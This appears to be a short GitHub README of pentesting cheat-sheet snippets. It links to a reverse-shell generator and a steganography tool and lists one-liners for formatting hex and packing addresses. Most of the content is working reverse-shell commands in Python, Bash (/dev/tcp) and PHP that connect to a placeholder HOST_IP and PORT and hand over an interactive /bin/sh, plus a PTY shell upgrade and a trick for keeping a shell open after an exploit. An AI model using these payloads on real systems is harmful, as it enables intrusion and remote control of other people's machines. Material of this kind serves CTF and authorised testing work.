
# Useful Scripts & Commands 🧰

## Scripts:

- [Revshell generator](https://github.com/AmitNiz/useful_stuff/blob/master/scripts/revshell_generator.py)
- [lsb stegnography tool](https://github.com/AmitNiz/useful_stuff/blob/master/scripts/simple_lsb_steg.py)

## Commands:

### Python 

- Convert numbers into a string in hex format (0x prefix with zero padding): `"{:#04x}.format(n)"`

- Print an address in little endian:
      
       python -c "import struct; print(struct.pack('<I',0xdeadbeef))"


- Oneline python revshell:


      python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{HOST_IP}",{PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
        
- Shell upgrade: 

      python -c "import pty;pty.spawn('/bin/bash')"

### Bash

- Maintain shell after running an exploiting: `(./exploit ; cat ) | ./vuln`
- Simple Bash revshell: 
    
      bash -i >& /dev/tcp/{HOST_IP}/{PORT} 0>&1

### PHP

- Oneline revshell: 

      php -r '$sock=fsockopen("{HOST_IP}",{PORT});exec("/bin/sh -i <&3 >&3 2>&3");'
